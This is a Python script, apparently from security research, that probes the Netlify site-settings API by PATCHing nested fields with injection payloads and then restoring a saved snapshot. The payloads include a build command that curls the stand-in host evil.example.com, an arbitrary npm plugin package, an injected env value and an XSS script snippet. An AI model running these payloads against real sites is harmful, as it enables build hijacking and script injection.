# -*- coding: utf-8 -*-
"""PATCH /api/v1/sites/{id} 嵌套字段族攻击(env/plugins/snippets/build_settings)
A 账号配额锁只影响 custom_domain,其他字段不受限。快照->打->恢复。
"""
import http.client, ssl, gzip, brotli, json, sys, random, string
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, SITE_A

ctx = ssl.create_default_context()

def req(method, path, body=None, timeout=30):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json',
         'Authorization': 'Bearer ' + TOKEN_A}
    b = json.dumps(body).encode() if body is not None else None
    conn.request(method, path, body=b, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    st = r.status
    txt = raw.decode('utf-8', 'ignore')
    conn.close()
    return st, txt

# 快照
st, b = req('GET', '/api/v1/sites/' + SITE_A)
J = json.loads(b)
snap = {k: J.get(k) for k in ['name', 'custom_domain', 'build_settings', 'plugins',
                              'processing_settings', 'publish_path', 'branch', 'snippet']}
print('snapshot build_settings =', str(snap.get('build_settings'))[:150])
print('snapshot plugins =', str(snap.get('plugins'))[:150])

tests = [
    ('build_settings.env 注入', {'build_settings': {'env': {'MY_INJ_%s' % random.randint(1000, 9999): 'pwned'}}}),
    ('build_settings.cmd 注入', {'build_settings': {'cmd': 'curl evil.example.com'}}),
    ('build_settings.stop_builds', {'build_settings': {'stop_builds': True}}),
    ('build_settings 整体覆盖', {'build_settings': {'env': {'A': '1'}, 'cmd': 'echo hi'}}),
    ('plugins 注入', {'plugins': [{'package': 'netlify-plugin-hello-world', 'pinned_version': '*'}]}),
    ('plugins 任意包', {'plugins': [{'package': 'npm://lodash@4.17.21', 'pinned_version': '*'}]}),
    ('snippet 注入', {'snippet': {'title': 'xss-%s' % random.randint(1000, 9999),
                                   'general': '<script>alert(1)</script>'}}),
    ('processing 注入 html', {'processing_settings': {'html': {'pretty_urls': True, 'minify': False}}}),
]

for label, body in tests:
    st, b = req('PATCH', '/api/v1/sites/' + SITE_A, body)
    # 检查是否回显
    sig = ''
    try:
        j = json.loads(b)
        for k in body:
            if k in j:
                sig = ' ECHO[%s]=%s' % (k, str(j[k])[:120])
    except Exception:
        pass
    print('%-28s %s | %s%s' % (label, st, b[:100], sig))

# 恢复 build_settings/plugins 到快照
st, b = req('PATCH', '/api/v1/sites/' + SITE_A,
            {'build_settings': snap.get('build_settings') or {},
             'plugins': snap.get('plugins') or []})
print('restore build_settings/plugins:', st, b[:100])

# 读回确认
st, b = req('GET', '/api/v1/sites/' + SITE_A)
j = json.loads(b)
print('verify: build_settings=%s plugins=%s' % (str(j.get('build_settings'))[:100], str(j.get('plugins'))[:100]))
print('done')
